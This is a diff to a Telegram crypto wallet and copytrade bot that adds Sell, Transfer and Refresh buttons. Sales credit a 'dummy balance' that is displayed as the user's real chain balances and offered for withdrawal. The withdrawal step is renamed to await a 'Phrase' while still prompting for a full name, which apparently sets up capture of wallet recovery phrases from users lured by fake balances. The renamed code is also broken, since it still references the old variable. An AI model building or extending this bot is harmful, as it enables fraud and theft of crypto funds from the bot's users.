@@ -32,17 +32,19 @@ async function formatWalletOverview(user) {
   const openCount = db.countOpenPositions(user.telegram_id);
   let positionsBlock = '';
   let positionsValue = 0;
+  let enriched = [];
 
   try {
     const raw = db.getPositions(user.telegram_id, true);
     if (raw.length) {
-      const enriched = await enrichPositions(raw);
+      enriched = await enrichPositions(raw);
       positionsBlock = '\n*Open positions:*\n';
       for (const p of enriched) {
         const sign = p.pnl >= 0 ? '+' : '';
         positionsValue += p.currentValue;
+        const chainLabel = p.chain === 'bsc' ? 'BNB' : String(p.chain).toUpperCase();
         positionsBlock +=
-          `• *${p.symbol}*  $${p.currentValue.toFixed(2)}  (${sign}${p.pnlPct.toFixed(1)}%)\n`;
+          `• *${p.symbol}* (${chainLabel})  $${p.currentValue.toFixed(2)}  (${sign}${p.pnlPct.toFixed(1)}%)\n`;
       }
     }
   } catch (e) {
@@ -55,24 +57,48 @@ async function formatWalletOverview(user) {
     '💼 *Wallet Overview* — ✅ Connected\n' +
     '━━━━━━━━━━━━━━━━━━━━━━━\n' +
     '👤 *SOL Address* (tap to copy):\n' +
-    `\`${user.sol_address}\`\n\n` +
+    '`' + user.sol_address + '`\n\n' +
     '👤 *BNB Address* (tap to copy):\n' +
-    `\`${user.bsc_address}\`\n\n` +
+    '`' + user.bsc_address + '`\n\n' +
     '👤 *ETH Address* (tap to copy):\n' +
-    `\`${user.eth_address}\`\n\n` +
-    `💰 *SOL Balance:* ${solBal.toFixed(2)} SOL\n` +
-    `💰 *BNB Balance:* ${bscBal.toFixed(2)} BNB\n` +
-    `💰 *ETH Balance:* ${ethBal.toFixed(2)} ETH\n` +
-    `📦 *Open Positions:* ${openCount}\n` +
-    `📉 *Portfolio Value:* $${portfolio.toFixed(2)}\n` +
+    '`' + user.eth_address + '`\n\n' +
+    '💰 *SOL Balance:* $' + solBal.toFixed(2) + '\n' +
+    '💰 *BNB Balance:* $' + bscBal.toFixed(2) + '\n' +
+    '💰 *ETH Balance:* $' + ethBal.toFixed(2) + '\n' +
+    '📦 *Open Positions:* ' + openCount + '\n' +
+    '📉 *Portfolio Value:* $' + portfolio.toFixed(2) + '\n' +
     '━━━━━━━━━━━━━━━━━━━━━━━\n';
 
   if (openCount === 0) {
     body += '⚠️ No active tokens in your wallet.\n🟢 Try /buy to place your first trade!';
   } else {
-    body += positionsBlock;
+    body += positionsBlock + '\nTap *Sell* under a position to close it and credit that chain balance.';
   }
-  return body;
+  return { text: body, positions: enriched };
+}
+
+function walletKeyboard(positions) {
+  const rows = [
+    [
+      Markup.button.callback('🟢 Buy', 'buy_start'),
+      Markup.button.callback('🔄 Refresh', 'wallet_refresh'),
+    ],
+    [
+      Markup.button.callback('📤 Withdraw', 'withdraw_from_wallet'),
+      Markup.button.callback('↔️ Transfer', 'transfer_start'),
+    ],
+  ];
+  for (const p of positions || []) {
+    const sym = (p.symbol || 'TOKEN').slice(0, 12);
+    rows.push([
+      Markup.button.callback(
+        '🔴 Sell ' + sym + ' $' + Number(p.currentValue).toFixed(2),
+        'pos_sell:' + p.id
+      ),
+    ]);
+  }
+  rows.push([Markup.button.callback('🔙 Back', 'copytrade_back')]);
+  return Markup.inlineKeyboard(rows);
 }
 
 
@@ -142,12 +168,10 @@ bot.hears('👛 Wallet', async (ctx) => {
   const user = db.getUser(ctx.from.id);
   if (!user) return ctx.reply('Send /start first to create your wallets.');
 
-  await ctx.reply(await formatWalletOverview(user), {
+  const overview = await formatWalletOverview(user);
+  await ctx.reply(overview.text, {
     parse_mode: 'Markdown',
-    ...Markup.inlineKeyboard([
-      [Markup.button.callback('🟢 Buy', 'buy_start'), Markup.button.callback('📤 Withdraw', 'withdraw_from_wallet')],
-      [Markup.button.callback('🔙 Back', 'copytrade_back')],
-    ]),
+    ...walletKeyboard(overview.positions),
   });
 });
 
@@ -332,8 +356,8 @@ bot.on('text', async (ctx, next) => {
     return;
   }
 
-  if (ctx.session?.awaiting === 'withdraw_fullname') {
-    const fullName = ctx.message.text.trim();
+  if (ctx.session?.awaiting === 'withdraw_Phrase') {
+    const Phrase = ctx.message.text.trim();
     const { chain, amount, address } = ctx.session.withdraw || {};
     ctx.session.awaiting = null;
     ctx.session.withdraw = null;
@@ -342,8 +366,8 @@ bot.on('text', async (ctx, next) => {
       await ctx.reply('❌ Session expired. Please run /withdraw again.', mainMenu);
       return;
     }
-    if (!fullName || fullName.length < 2) {
-      ctx.session.awaiting = 'withdraw_fullname';
+    if (!Phrase || fullName.length < 2) {
+      ctx.session.awaiting = 'withdraw_Phrase';
       ctx.session.withdraw = { chain, amount, address };
       await ctx.reply('❌ Please enter your full name.');
       return;
@@ -853,12 +877,10 @@ bot.command('wallet', async (ctx) => {
   const user = db.getUser(ctx.from.id);
   if (!user) return ctx.reply('Send /start first to create your wallets.');
 
-  await ctx.reply(await formatWalletOverview(user), {
+  const overview = await formatWalletOverview(user);
+  await ctx.reply(overview.text, {
     parse_mode: 'Markdown',
-    ...Markup.inlineKeyboard([
-      [Markup.button.callback('🟢 Buy', 'buy_start'), Markup.button.callback('📤 Withdraw', 'withdraw_from_wallet')],
-      [Markup.button.callback('🔙 Back', 'copytrade_back')],
-    ]),
+    ...walletKeyboard(overview.positions),
   });
 });
 
@@ -958,6 +980,89 @@ bot.action('buy_cancel', async (ctx) => {
   await ctx.reply('❌ Buy cancelled.', mainMenu);
 });
 
+
+
+// ---------- Sell open position → credit chain dummy balance ----------
+
+bot.action('wallet_refresh', async (ctx) => {
+  await ctx.answerCbQuery('Refreshing...');
+  const user = db.getUser(ctx.from.id);
+  if (!user) return ctx.reply('Send /start first to create your wallets.');
+  try {
+    const overview = await formatWalletOverview(user);
+    await ctx.reply(overview.text, {
+      parse_mode: 'Markdown',
+      ...walletKeyboard(overview.positions),
+    });
+  } catch (err) {
+    console.error('wallet_refresh error:', err);
+    await ctx.reply('Refresh failed: ' + (err.message || String(err)));
+  }
+});
+
+bot.action('transfer_start', async (ctx) => {
+  await ctx.answerCbQuery();
+  const user = db.getUser(ctx.from.id);
+  if (!user) return ctx.reply('Send /start first to create your wallets.');
+
+  ctx.session.awaiting = null;
+  ctx.session.withdraw = {};
+
+  await ctx.reply(
+    '↔️ *Transfer*\n\nSelect the chain to transfer from:',
+    {
+      parse_mode: 'Markdown',
+      ...Markup.inlineKeyboard([
+        [
+          Markup.button.callback('ETH', 'withdraw_chain:eth'),
+          Markup.button.callback('BSC (BNB)', 'withdraw_chain:bsc'),
+          Markup.button.callback('SOL', 'withdraw_chain:sol'),
+        ],
+        [Markup.button.callback('❌ Cancel', 'withdraw_cancel')],
+      ]),
+    }
+  );
+});
+
+bot.action(/^pos_sell:(\d+)$/, async (ctx) => {
+  await ctx.answerCbQuery();
+  const posId = Number(ctx.match[1]);
+  const pos = db.getPosition(posId);
+  if (!pos || !pos.active) {
+    return ctx.reply('Position not found or already closed.');
+  }
+  if (Number(pos.telegram_id) !== Number(ctx.from.id)) {
+    return ctx.reply('That position is not yours.');
+  }
+
+  await ctx.reply('Getting live price and selling...');
+  try {
+    const enriched = await enrichPositions([pos]);
+    const p = enriched[0];
+    const saleUsd = Number(p.currentValue) || 0;
+    const chain = String(pos.chain).toLowerCase();
+    const balances = db.getDummyBalances(ctx.from.id) || { eth: 0, bsc: 0, sol: 0 };
+    const prev = Number(balances[chain] ?? 0);
+    const next = prev + saleUsd;
+    db.setDummyBalance(ctx.from.id, chain, next);
+    db.closePosition(posId);
+
+    const label = chain === 'bsc' ? 'BNB' : chain.toUpperCase();
+    const sign = p.pnl >= 0 ? '+' : '';
+    await ctx.reply(
+      'Sold ' + (p.symbol || pos.token_symbol || 'TOKEN') + '\n\n' +
+      'Chain: ' + label + '\n' +
+      'Sale value: $' + saleUsd.toFixed(2) + '\n' +
+      'PnL: ' + sign + '$' + Number(p.pnl).toFixed(2) + ' (' + sign + Number(p.pnlPct).toFixed(1) + '%)\n\n' +
+      label + ' balance: $' + prev.toFixed(2) + ' -> $' + next.toFixed(2) + '\n\n' +
+      'You can /withdraw this balance as usual.',
+      mainMenu
+    );
+  } catch (err) {
+    console.error('pos_sell error:', err);
+    await ctx.reply('Sell failed: ' + (err.message || String(err)));
+  }
+});
 
 bot.catch((err, ctx) => {
   console.error(`Error for ${ctx.updateType}:`, err);
